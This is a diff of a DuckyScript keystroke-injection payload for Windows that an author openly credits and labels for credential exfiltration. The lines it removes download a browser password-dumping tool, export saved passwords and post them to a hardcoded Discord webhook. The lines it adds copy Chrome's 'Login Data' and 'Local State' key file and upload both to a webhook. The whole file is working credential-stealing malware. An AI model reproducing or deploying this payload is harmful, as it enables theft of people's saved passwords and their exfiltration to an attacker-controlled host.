@@ -7,6 +7,10 @@ REM # Category     : Credentials, Exfiltrate                  |
 REM # Target       : Windows                                  |
 REM #                                                         |
 REM ##########################################################
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Copies the chrome login file and sends it to a discord webhook.
+REM Version:	1.0
+REM Category:	Passwords
 DELAY 500
 WINDOWS d
 DELAY 500
@@ -18,8 +22,11 @@ DELAY 800
 LEFTARROW
 ENTER
 DELAY 800
-STRING $hookurl = "https://discord.com/api/webhooks/1164596165849927792/7ASILUXC1ya92O9OsNFDXhVS_MBFOkTZWlBLVaTtzVwXeO8jz1_IGi5w82goz88vProJ"
+STRING $hookurl = "insert webhook url"
 ENTER
 DELAY 300
-STRING mkdir \temp; cd \temp; Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip; Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip; Expand-Archive 7z.zip; .\7z\7za.exe e wbpv.zip; Start-Sleep -Seconds 5; $pass = ConvertTo-SecureString 'wbpv28821@' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential ('', $pass); Start-Process -FilePath .\WebBrowserPassView.exe -Credential $cred -Wait; Start-Sleep -Seconds 3; $wshell = New-Object -ComObject Wscript.Shell; $wshell.SendKeys('^{A}'); $wshell.SendKeys('^{S}'); Start-Sleep -Seconds 1; $wshell.SendKeys('export'); $wshell.SendKeys('{Tab}'); $wshell.SendKeys('h'); $wshell.SendKeys('{Enter}'); Start-Sleep -Seconds 1; $wshell.SendKeys('%{F4}'); Start-Sleep -Seconds 1; $file = 'C:\temp\export.htm'; function Upload-Discord {[CmdletBinding()] param ([parameter(Position=0,Mandatory=$False)][string]$file,[parameter(Position=1,Mandatory=$False)][string]$text); $Body = @{'username' = $env:username; 'content' = $text}; if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)}; if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F 'file1=@$file' $hookurl}; }; Upload-Discord -file 'C:\temp\export.htm' -text 'File:'
+STRING $sourceFile1 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"; $outputFile1 = "$([System.Environment]::GetFolderPath('Desktop'))\output.txt"; Copy-Item $sourceFile1 $outputFile1; Upload-Discord -file $outputFile1 -text ":)"; Remove-Item $outputFile1; $sourceFile2 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"; $outputFile2 = "$([System.Environment]::GetFolderPath('Desktop'))\key.txt"; Copy-Item $sourceFile2 $outputFile2; Upload-Discord -file $outputFile2 -text "Key-File"; Remove-Item $outputFile2
+ENTER
+DELAY 1000
+STRING exit
 ENTER
